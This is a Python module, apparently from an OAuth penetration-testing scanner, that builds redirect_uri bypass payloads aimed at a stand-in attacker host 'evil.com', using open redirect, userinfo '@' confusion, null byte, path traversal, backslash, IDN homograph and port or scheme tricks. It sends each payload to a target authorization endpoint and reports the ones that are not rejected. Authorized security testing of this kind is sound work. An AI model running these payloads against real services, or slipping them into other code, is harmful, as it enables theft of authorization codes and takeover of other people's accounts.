"""
Check: redirect_uri Bypass Attacks
------------------------------------
The redirect_uri controls where the auth code lands.
Bypassing validation = code theft = account takeover.

Tests:
  1. Open redirect — different domain accepted
  2. Path traversal — registered /callback → /callback/../steal
  3. Subdomain wildcard — registered app.com → evil.app.com
  4. URL fragment abuse — code ends up in fragment
  5. Null byte injection — /callback%00.evil.com
  6. Multiple redirect_uri params
  7. Localhost bypass
  8. IP address substitution
  9. URL encoding bypass
  10. Scheme confusion — http vs https
  11. Port manipulation
  12. Partial matching exploits
"""

import urllib.parse
from ..core import (http_request, build_auth_url, parse_url_params,
                    R, G, Y, C, DIM, BOLD, RST)


def _build_uri_variants(registered_uri: str, attacker_domain: str = "evil.com") -> list:
    """Generate all redirect_uri bypass variants from a registered URI."""
    parsed = urllib.parse.urlparse(registered_uri)
    host   = parsed.hostname or ""
    scheme = parsed.scheme or "https"
    path   = parsed.path or "/"
    port   = parsed.port

    variants = []

    # 1. Open redirect — completely different domain
    variants.append(("open_redirect_full",
                     f"https://{attacker_domain}/steal",
                     "Completely different domain"))

    # 2. Subdomain of registered host
    variants.append(("subdomain",
                     f"{scheme}://evil.{host}{path}",
                     "Attacker subdomain of registered host"))

    # 3. Registered host as subdomain of attacker
    variants.append(("host_as_subdomain",
                     f"{scheme}://{host}.{attacker_domain}{path}",
                     "Registered host as subdomain of attacker"))

    # 4. Path traversal
    variants.append(("path_traversal",
                     f"{scheme}://{host}{path}/../../../steal",
                     "Path traversal above registered path"))
    variants.append(("path_traversal_encoded",
                     f"{scheme}://{host}{path}%2F..%2F..%2Fsteal",
                     "URL-encoded path traversal"))

    # 5. Null byte injection
    variants.append(("null_byte",
                     f"{scheme}://{host}{path}%00.{attacker_domain}",
                     "Null byte to confuse parser"))

    # 6. Multiple @ signs (userinfo confusion)
    variants.append(("at_confusion",
                     f"{scheme}://{attacker_domain}@{host}{path}",
                     "Attacker in userinfo, real host in host"))
    variants.append(("at_confusion2",
                     f"{scheme}://{host}@{attacker_domain}{path}",
                     "Real host in userinfo, attacker as actual host"))

    # 7. Scheme downgrade
    variants.append(("http_downgrade",
                     f"http://{host}{path}",
                     "HTTP instead of HTTPS"))

    # 8. Localhost bypass
    variants.append(("localhost",
                     f"{scheme}://localhost{path}",
                     "Localhost bypass"))
    variants.append(("localhost_127",
                     f"{scheme}://127.0.0.1{path}",
                     "127.0.0.1 localhost bypass"))

    # 9. URL fragment theft
    variants.append(("fragment_theft",
                     f"https://{attacker_domain}#{registered_uri}",
                     "Code lands in fragment of attacker domain"))

    # 10. Unicode/IDN confusion
    variants.append(("unicode_confusable",
                     f"{scheme}://xn--{host.replace('.', '-')}.{attacker_domain}{path}",
                     "IDN homograph attack"))

    # 11. Port manipulation
    for p in ("80", "443", "8080", "8443"):
        if str(port) != p:
            variants.append((f"port_{p}",
                              f"{scheme}://{host}:{p}{path}",
                              f"Non-standard port {p}"))

    # 12. Wildcard/partial match
    variants.append(("partial_match_prefix",
                     f"{scheme}://{host}{path}extra",
                     "Extra chars appended to path"))
    variants.append(("partial_match_query",
                     f"{scheme}://{host}{path}?next=https://{attacker_domain}",
                     "Attacker domain in query of registered URI"))

    # 13. Double URL encoding
    encoded_host = urllib.parse.quote(host)
    variants.append(("double_encoded",
                     f"{scheme}://{encoded_host}{path}",
                     "Double-encoded host"))

    # 14. Backslash confusion
    variants.append(("backslash",
                     f"{scheme}://{host}\\@{attacker_domain}{path}",
                     "Backslash to confuse URL parsers"))

    # 15. Case sensitivity
    variants.append(("uppercase_host",
                     f"{scheme}://{host.upper()}{path}",
                     "Uppercase host — case-insensitive match"))

    return variants


def test_redirect_uri_bypass(auth_endpoint: str, client_id: str,
                              registered_uri: str, attacker_domain: str = "evil.com",
                              scope: str = "openid profile",
                              custom_uris: list = None,
                              verbose: bool = True) -> list:
    """
    Test all redirect_uri bypass variants.
    Returns list of findings.
    """
    findings = []
    variants = _build_uri_variants(registered_uri, attacker_domain)

    if custom_uris:
        for uri in custom_uris:
            variants.append(("custom", uri, "Custom URI"))

    if verbose:
        print(f"\n  {C}[REDIRECT_URI BYPASS]{RST} "
              f"Testing {len(variants)} variants")

    for name, test_uri, desc in variants:
        params = {
            "response_type": "code",
            "client_id":     client_id,
            "redirect_uri":  test_uri,
            "scope":         scope,
            "state":         "test_state_123",
        }
        url = build_auth_url(auth_endpoint, params)
        resp = http_request(url, follow_redirects=False)

        # Check if variant was rejected
        body_lower = resp["body"].lower()
        location   = resp["headers"].get("location", "")

        rejection_signals = [
            "invalid redirect", "redirect_uri.*mismatch", "unauthorized redirect",
            "invalid_request", "redirect_uri_mismatch",
            "not.*allowed", "not.*registered", "invalid.*uri",
        ]
        rejected = any(__import__("re").search(p, body_lower) for p in rejection_signals)
        rejected = rejected or resp["status"] in (400, 401, 403)

        if not rejected and resp["status"] in (200, 302, 301):
            # Check if location header points to our URI
            redirected_to_attacker = (
                attacker_domain in location or
                attacker_domain in resp["url"] or
                test_uri in location
            )

            finding = {
                "check":    "redirect_uri_bypass",
                "variant":  name,
                "uri_tested": test_uri,
                "desc":     desc,
                "status":   resp["status"],
                "location": location,
                "confirmed": redirected_to_attacker,
                "vulnerable": True,
                "severity": "Critical" if redirected_to_attacker else "Medium",
                "detail": (
                    f"redirect_uri={test_uri} was NOT rejected — {desc}. "
                    f"{'Location redirects to attacker domain!' if redirected_to_attacker else 'No explicit rejection.'}"
                )
            }
            findings.append(finding)

            if verbose:
                conf = f"{R}CONFIRMED{RST}" if redirected_to_attacker else f"{Y}POSSIBLE{RST}"
                print(f"  [{conf}] {name}: {test_uri[:70]}")
        else:
            if verbose and name in ("open_redirect_full", "subdomain", "path_traversal"):
                print(f"  [{DIM}rejected{RST}] {name}")

    return findings


def run_all(auth_endpoint: str, client_id: str, registered_uri: str,
            attacker_domain: str = "evil.com", scope: str = "openid profile",
            custom_uris: list = None, verbose: bool = True) -> list:
    return test_redirect_uri_bypass(
        auth_endpoint, client_id, registered_uri,
        attacker_domain, scope, custom_uris, verbose
    )
